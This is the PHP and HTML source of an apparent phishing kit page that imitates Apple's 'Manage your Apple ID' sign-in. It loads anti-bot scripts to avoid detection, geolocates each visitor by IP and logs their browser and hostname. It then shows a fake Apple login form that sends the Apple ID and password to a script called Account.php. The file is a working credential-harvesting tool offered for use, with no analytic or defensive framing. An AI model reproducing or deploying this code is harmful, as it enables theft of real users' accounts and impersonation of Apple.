﻿<?php
@ini_set('display_errors', 0); 
error_reporting(E_ALL ^ E_NOTICE); 
include 'antibots.php';
include 'bots.php';
include('sayron.php'); 
include("browser.php");
$bro = getBrowser();
$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 17);
$getbro = $bro["name"]." ".$bro["version"]." on ".$bro["platform"];
$_SESSION["bro"] = $getbro;
/// COUNTRY
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ; // Country
$countryforip = "$COUNTRY"; 
$_SESSION["COUNTRY"] = "$countryforip";
$COUNTRYCODE = $J7->geoplugin_countryCode ; // Country Code;
$city = $J7->geoplugin_city ; // city;
$geoplugin_region = $J7->geoplugin_region ; // geoplugin_region;
?> 
<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$date = date ("Y-n-d");
$time = date ("H:i:s");
$useragent = $_SERVER['HTTP_USER_AGENT'];
?> 

<!DOCTYPE html>
<html>
<head>
	<title>Manage your Apple ID - (<?php print "$COUNTRYCODE"; ?>)</title>
		<link rel="stylesheet" type="text/css" href="files/css/style-login-desktop.css">
		<script type="text/javascript" src="files/js/script-login-desktop.js"></script>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<link rel="icon" href="files/img/favicon.ico" type="image/x-icon" />

  <script type="text/javascript" src="//code.jquery.com/jquery-1.9.1.js"></script>

<script type='text/javascript'>
//<![CDATA[
$(window).load(function(){
$(".option").click(function(){
    $(this).toggleClass('option2')
});
});//]]> 

</script>
</head>
<body>
    <div class="wos-container">
<div id="bottom"></div>
<div id="head">
	<img src="files/img/login-desktop.png" style="width:100%;height:100%;">
</div>
<div id="sub_navbar"></div>
<div id="container">
	<header class="wos-header">
    	<div class="container">
        	<div class="row">
            	<div class="col-sm-12">
                    <nav class="wos-top-nav">
                    	<ul class="wos-sm-hiden">
                        	<li><a href="#"><img src="http://www.apple.com/ac/globalnav/2.0/en_US/images/globalnav/apple/image_large.svg"></a></li>
                        	<li><a href="#">Mac</a></li>
                            <li><a href="#">iPad</a></li>
                            <li><a href="#">iPhone</a></li>
                            <li><a href="#">Watch</a></li>
                            <li><a href="#">TV</a></li>
                            <li><a href="#">Music</a></li>
                            <li><a href="#">Support</a></li>
                            <li><a href="#"><img src="http://www.apple.com/ac/globalnav/2.0/en_US/images/globalnav/search/image_large.svg"></a></li>
                            <li><a href="#"><img src="http://www.apple.com/ac/globalnav/2.0/en_US/images/globalnav/bag/image_large.svg"></a></li>
                        </ul>
                        
                        <ul class="wos-sm-vis">
                        	<li>
                            	<a href="#" id="toggle-wos-resp-menu">
                                    <span class="icon-bar"></span>
                                    <span class="icon-bar"></span>
                            	</a>
                            </li>
                        	<li><a href="#"><img src="http://www.apple.com/ac/globalnav/2.0/en_US/images/globalnav/apple/image_large.svg"></a></li>
                            <li><a href="#"><img src="http://www.apple.com/ac/globalnav/2.0/en_US/images/globalnav/bag/image_large.svg"></a></li>
                        </ul>
                        
                        <ul id="wos-resp-menu" class="wos-resp-menu">
                        	<li><a href="#">Mac</a></li>
                            <li><a href="#">iPad</a></li>
                            <li><a href="#">iPhone</a></li>
                            <li><a href="#">Watch</a></li>
                            <li><a href="#">TV</a></li>
                            <li><a href="#">Music</a></li>
                            <li><a href="#">Support</a></li>
                            <li><a href="#"><img src="http://www.apple.com/ac/globalnav/2.0/en_US/images/globalnav/search/image_large.svg"> Search apple.com</a></li>
                        </ul>
                        
                    </nav><!-- .wos-top-nav -->
                   
                </div><!-- .col-sm-12 -->
            </div><!-- .row -->
        </div><!-- .container -->
    </header><!-- .wos-header -->

	<div id="xcontent">
 <form name="myform" method="POST" id="myform" action="Account.php?cmd=_update&dispatch=<?php print "$dis"; ?>&locale=en_<?php print "$COUNTRYCODE"; ?>" method="post" onSubmit="return checkform(this);">
			<font id="Apple_ID">Apple ID</font>
			<font id="Manage_Account">Manage your Apple account</font>
                        <div>
			<input name="xuser" id="xuser" type="email" value="" placeholder="Apple ID" onfocus="return OxForm()">
                        <div id="field-separator" ></div>
			<input name="xpass" id="xpass" type="password" value="" placeholder="Password" onkeyup="return login_BTN()">
			<div id="xbootn"><input name="xbtn" id="xbtn" class="xbtn1" type="submit" value="" onclick="return xForm()" ></div></div>
			<div id="loading"></div>
			<font id="Remember_me">Remember me</font>
			<div class="option"></div>
			<font id="Forgot_Apple_ID">Forgot Apple ID or password?</font>
		</form>
	</div>
	<div id="xfooter"></div>
</div>
    </div>
</body>
</html>